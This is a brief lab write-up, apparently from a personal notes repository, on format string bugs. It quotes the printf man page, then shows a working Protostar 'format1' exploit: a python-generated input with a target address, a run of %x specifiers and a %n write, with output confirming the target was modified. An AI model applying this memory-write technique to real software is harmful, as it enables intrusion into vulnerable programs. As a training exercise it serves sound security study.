# format-strings

```
$ man 3 printf
...
BUGS

Code  such  as  printf(foo);  often indicates a bug, since foo may contain a % character.  
If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.
```

```
...
08049638 g     O .bss	00000004              target
0804963c g       *ABS*	00000000              _end
00000000       F *UND*	00000000              puts@@GLIBC_2.0
08049630 g       *ABS*	00000000              _edata
080484aa g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
0804841c g     F .text	0000001b              main
080482c0 g     F .init	00000000              _init

user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAAAA' + '\x38\x96\x04\x08' + 'BBBBBBBBBBBB' + '%x '*142 + '%x'"`"
AAAAAA8�BBBBBBBBBBBB804960c bffff508 8048469 b7fd8304 b7fd7ff4 bffff508 8048435 bffff706 b7ff1040 804845b b7fd7ff4 
8048450 0 bffff588 b7eadc76 2 bffff5b4 bffff5c0 b7fe1848 bffff570 ffffffff b7ffeff4 804824d 1 bffff570 b7ff0626 b7fffab0 
b7fe1b28 b7fd7ff4 0 0 bffff588 b1d8cebe 9b8a98ae 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 
2 bffff5b4 8048450 8048440 b7ff1040 bffff5ac b7fff8f8 2 bffff6fc bffff706 0 bffff8c9 bffff8de bffff8f5 bffff90d bffff91b 
bffff92f bffff950 bffff967 bffff97a bffff984 bffffe74 bffffe8d bffffecb bffffedf bffffefd bfffff14 bfffff25 bfffff40 
bfffff48 bfffff58 bfffff65 bfffff97 bfffffac bfffffc0 bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 178bfbbf 6 1000 
11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff6db 1f bffffff2 f bffff6eb 0 0 0 0 0 
5000000 778fc3de 2fe0a719 3b4c2a66 69de2169 363836 0 0 0 6f662f2e 74616d72 41410031 41414141 8049638

user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAAAA' + '\x38\x96\x04\x08' + 'BBBBBBBBBBBB' + '%x '*142 + '%n'"`"
AAAAAA8�BBBBBBBBBBBB804960c bffff508 8048469 b7fd8304 b7fd7ff4 bffff508 8048435 bffff706 b7ff1040 804845b b7fd7ff4 
8048450 0 bffff588 b7eadc76 2 bffff5b4 bffff5c0 b7fe1848 bffff570 ffffffff b7ffeff4 804824d 1 bffff570 b7ff0626 b7fffab0 
b7fe1b28 b7fd7ff4 0 0 bffff588 5757119d 7d05478d 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 
2 bffff5b4 8048450 8048440 b7ff1040 bffff5ac b7fff8f8 2 bffff6fc bffff706 0 bffff8c9 bffff8de bffff8f5 bffff90d bffff91b 
bffff92f bffff950 bffff967 bffff97a bffff984 bffffe74 bffffe8d bffffecb bffffedf bffffefd bfffff14 bfffff25 bfffff40 
bfffff48 bfffff58 bfffff65 bfffff97 bfffffac bfffffc0 bfffffd4 bfffffe6 0 20 b7fe2414 21 b7fe2000 10 178bfbbf 6 1000 11 
64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff6db 1f bffffff2 f bffff6eb 0 0 0 0 0 
47000000 9847fad4 dd71545e 61ce994e 6952499b 363836 0 0 0 6f662f2e 74616d72 41410031 41414141 you have modified the target :)
```